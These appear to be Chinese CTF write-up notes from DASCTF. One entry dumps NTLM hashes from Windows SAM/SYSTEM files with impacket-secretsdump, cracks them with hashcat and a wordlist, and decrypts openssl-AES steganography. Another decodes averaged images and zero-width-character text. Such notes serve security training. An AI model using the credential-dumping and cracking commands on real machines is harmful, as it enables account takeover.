## [来自实战] SAM_and_Steg — SAM/SYSTEM hash提取 + openssl AES解密隐写 (DASCTF)

**技术模式**: 从Windows SAM/SYSTEM文件提取NTLM hash → hashcat爆破 → 用密码做openssl AES-256-CBC解密图片隐写内容。

**关键操作**:
1. 文件：SAM（密码数据库）+ SYSTEM（包含boot key，用于解密SAM）
2. 提取hash：
   ```bash
   impacket-secretsdump -sam sam -system system LOCAL
   ```
3. 输出格式：`Administrator:500:aad3b435b51404ee:<NTLM_HASH>:::`
4. hashcat爆破NTLM：
   ```bash
   hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
   ```
5. 得到密码后提取图片隐写（题目提示openssl + AES256）：
   ```bash
   openssl enc -d -aes-256-cbc -in AES256 -out aes.dec -pass pass:<password>
   gunzip -c aes.dec > output.tar  # 或其他格式
   ```

**适用场景**: 取证题有SAM+SYSTEM文件 → impacket-secretsdump；NTLM hash是32位hex，hashcat -m 1000；openssl隐写文件无扩展名时file命令检查格式；密文后gunzip/untar

---

## [来自实战] Time_and_chaos_1 — 多图均值合成+颜色反转 + 零宽字符隐写→UTF-16BE (DASCTF)

**技术模式**: 多张PNG均值合成显示隐藏图案（颜色反转更清晰），flag.txt中用4种零宽字符编码2bit信息，拼成二进制流后按UTF-16BE解码。

**关键操作 — 多图均值合成**:
```python
from PIL import Image, ImageOps
import numpy as np
imgs = [np.array(Image.open(f"{i}.png").convert("RGB"), dtype=np.uint8) for i in range(1, 9)]
mean_img = np.mean(np.stack(imgs), axis=0).astype(np.uint8)
Image.fromarray(mean_img).save("mean.png")
ImageOps.invert(Image.fromarray(mean_img)).save("mean_inv.png")  # 反转后更清晰
```

**关键操作 — 零宽字符隐写**:
1. 4种零宽字符各编码2bit：
   ```python
   mapping = {0x200C: "00", 0x200D: "01", 0x202C: "10", 0xFEFF: "11"}
   ```
2. 提取并解码：
   ```python
   s = open("flag.txt", "r", encoding="utf-8").read()
   zw = "".join(ch for ch in s if ord(ch) in (0x200C, 0x200D, 0x202C, 0xFEFF))
   bits = "".join(mapping[ord(ch)] for ch in zw)
   data = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))
   text = data.decode("utf-16-be")  # 注意是UTF-16大端序
   ```

**适用场景**: 多图叠加/均值 → 去噪显示隐藏内容；颜色反转通常更易识别；零宽字符隐写优先检查4种常见Unicode：U+200B/200C/200D/202C/FEFF；2bit映射→拼成字节→UTF-16BE是常见解码链
